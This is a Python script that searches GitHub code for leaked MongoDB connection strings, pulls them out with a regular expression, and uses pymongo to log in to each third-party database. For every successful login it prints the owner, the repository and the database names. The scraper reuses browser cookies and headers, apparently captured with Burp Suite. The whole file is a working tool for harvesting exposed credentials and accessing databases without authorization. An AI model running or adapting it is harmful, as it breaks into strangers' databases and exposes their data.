import requests 
from bs4 import BeautifulSoup


from dotenv import load_dotenv
import os
import json
import re
import time
import pymongo
#Start http session
session = requests.session()

#Load the env variables
load_dotenv()
global counter
counter = 0

    
def get_code_snippet(html): 
    code_snippet = html.find_all('div', class_='Box-sc-g0xbh4-0 hvmjsx')
    # get all classes that contains Box-sc-g0xbh4-0 
    # res = html.find_all('span', class_=lambda x: x and 'prc-Text-Text-0ima0' in x)
    res = html.find_all('div', class_=lambda x: x and 'Box-sc-g0xbh4-0 bmcJak' in x)
    # res = html.find_all('td', class_='blob-code blob-code-inner')
    return res
def getReposOwner(html):
    owner = html.find_all('a', class_='Box-sc-g0xbh4-0 ihfUTd prc-Link-Link-85e08')
    return owner
def get_pages(url):
    response = session.get(url, headers=json.loads(os.getenv('burp0_headers')), cookies=json.loads(os.getenv('burp0_cookies')))
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup

def getMongoURL(code): 
    #use regex to get the mongo url from the code snippet which is a string
    #Starts with mongodb+srv:// and ends .net/ or .com/
    pattern = r"mongodb\+srv:\/\/[^\/\s]+"
    match = re.search(pattern, code)
    return match.group(0) if match else None
def TestConnectionAndListDatabases(url):
    #Test the connection to the mongodb server and list all the databases
    #Use the pymongo library to connect to the mongodb server
    #Use the pymongo library to list all the databases
    #Use the pymongo library to list all the collections in the databases
    #Return the list of databases and collections
    try:
        client = pymongo.MongoClient(url+"/?retryWrites=true&w=majority")
        databases = client.list_database_names()
        return databases
    except Exception as e:
        return None
def getResultForPage(page_number):
    global counter 
    
    res = []
    #In the search query, we are searching for mongodb+srv://{any character} NOT is:archived
    #Include all the characters in the search query to get all the results
    #Also include numbers in the search query 
    #Also include special characters in the search query
    char = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!']
    for ch in char:
        time.sleep(1)
        url = f'https://github.com/search?q=mongodb%2Bsrv%3A%2F%2F{ch}+NOT+is%3Aarchived&type=code&ref=advsearch&p={page_number}'
        soup = get_pages(url)
        for tag in get_code_snippet(soup): 
            owners = getReposOwner(tag)
            for owner in owners:
                code_dict = {
                    "owner": "",
                    "repos_url": "",
                    "code": "",
                    "mongo_url": ""
                }  
                code_dict['owner'] = owner.text.split('/')[0]
                code_dict['repos_url'] = f"https://github.com/{owner['href']}"
                code_dict['code'] = tag.text
                code_dict['mongo_url'] = getMongoURL(tag.text)
                if code_dict['mongo_url']:
                    db = TestConnectionAndListDatabases(code_dict['mongo_url'])
                    if db:
                        counter += 1
                        print(f"Counter: {counter}")
                        print(f"Owner: {code_dict['owner']}")
                        print(f"Repos URL: {code_dict['repos_url']}")
                        for d in db: 
                            print(f"Database: {d}")
                    else: 
                        print(f"Failed to connect to the mongodb server: {code_dict['mongo_url']}")

                # print(f"Current URL: {code_dict['repos_url']}")
                res.append(code_dict)
    return res
    
if __name__ == '__main__':
    all_results = []
    for i in range(1, 5):
        res = getResultForPage(i)
        all_results.append(res)
    
    print(f"Total results: {counter}")